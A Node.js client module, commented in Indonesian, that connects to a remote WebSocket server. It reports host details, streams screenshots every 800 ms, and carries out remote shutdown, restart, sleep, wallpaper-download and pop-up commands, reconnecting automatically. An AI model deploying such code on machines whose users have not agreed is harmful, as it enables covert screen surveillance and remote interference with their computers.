const WebSocket = require('ws');
const os = require('os');
const ScreenService = require('./ScreenService');
const { exec } = require('child_process');
const https = require('https');
const fs = require('fs');
const path = require('path');
const wallpaper = require('wallpaper');
const notifier = require('node-notifier'); // 🔥 NEW
const system = require('./SystemService');
const WS_URL = "wss://tele.chaerul.xyz";

class Client {

    constructor() {
        this.ws = null;
        this.screenInterval = null;
        this.isSettingWallpaper = false;
    }

    connect() {

        console.log("🔌 Connecting ke server...");

        this.ws = new WebSocket(WS_URL);

        this.ws.on('open', () => {
            console.log("✅ Connected ke server");

            // REGISTER
            this.ws.send(JSON.stringify({
                type: 'register',
                data: {
                    hostname: os.hostname(),
                    platform: os.platform(),
                    arch: os.arch()
                }
            }));

            this.startScreen();
        });

        this.ws.on('message', (msg) => {
            try {
                const data = JSON.parse(msg.toString());

                if (data.type === 'command') {

                    console.log("⚡ COMMAND:", data.action);

                    // this.notify("Command Masuk", data.action);

                    // 🔴 SHUTDOWN
                    if (data.action === 'shutdown') {
                        system.shutdown();
                    }

                    if (data.action === 'restart') {
                        system.restart();
                    }

                    if (data.action === 'sleep') {
                        system.sleep();
                    }

                    // 🖼 WALLPAPER
                    if (data.action === 'wallpaper' && data.url) {

                        if (this.isSettingWallpaper) return;

                        this.isSettingWallpaper = true;

                        // this.notify("Wallpaper", "Sedang mengganti wallpaper");

                        this.setWallpaper(data.url);
                    }
                    if (data.action === 'msg' && data.message) {
                        this.notify("System", data.message);
                    }
                }

            } catch (err) {
                console.log("❌ ERROR:", err.message);
            }
        });

        this.ws.on('close', () => {
            console.log("❌ Disconnect, reconnecting...");

            // this.notify("Disconnected", "Reconnect dalam 5 detik");

            if (this.screenInterval) {
                clearInterval(this.screenInterval);
                this.screenInterval = null;
            }

            setTimeout(() => this.connect(), 5000);
        });

        this.ws.on('error', (err) => {
            console.log("⚠️ Error:", err.message);
        });
    }

    // ================= NOTIFIER =================
    notify(title, message) {
        notifier.notify({
            title: title,
            message: message,
            sound: true,
            wait: false
        });
    }

    // ================= WALLPAPER =================
    async setWallpaper(url) {

        const filePath = path.join(__dirname, 'wallpaper.jpg');

        console.log("⬇️ Download wallpaper ke:", filePath);

        const file = fs.createWriteStream(filePath);

        https.get(url, (res) => {

            if (res.statusCode !== 200) {
                console.log("❌ Gagal download:", res.statusCode);
                // this.notify("Error", "Download gagal");
                this.isSettingWallpaper = false;
                return;
            }

            res.pipe(file);

            file.on('finish', async () => {
                file.close(async () => {

                    try {
                        console.log("🖼 Set wallpaper...");

                        await wallpaper.setWallpaper(filePath);

                        console.log("✅ Wallpaper berhasil diganti");
                        // this.notify("Sukses", "Wallpaper berhasil diganti");

                    } catch (err) {
                        console.log("❌ Gagal set wallpaper:", err.message);
                        // this.notify("Error", "Gagal set wallpaper");
                    }

                    this.isSettingWallpaper = false;
                });
            });

        }).on('error', (err) => {
            console.log("❌ Download error:", err.message);
            // this.notify("Error", "Download error");
            this.isSettingWallpaper = false;
        });
    }

    // ================= SCREEN =================
    startScreen() {

        if (this.screenInterval) return;

        this.screenInterval = setInterval(async () => {
            try {

                const screen = await ScreenService.capture();

                if (!screen) return;

                if (this.ws.readyState === WebSocket.OPEN) {
                    this.ws.send(JSON.stringify({
                        type: 'screen',
                        data: screen
                    }));
                }

            } catch (err) {
                console.log("❌ Screen error:", err.message);
            }
        }, 800);
    }
}

module.exports = new Client();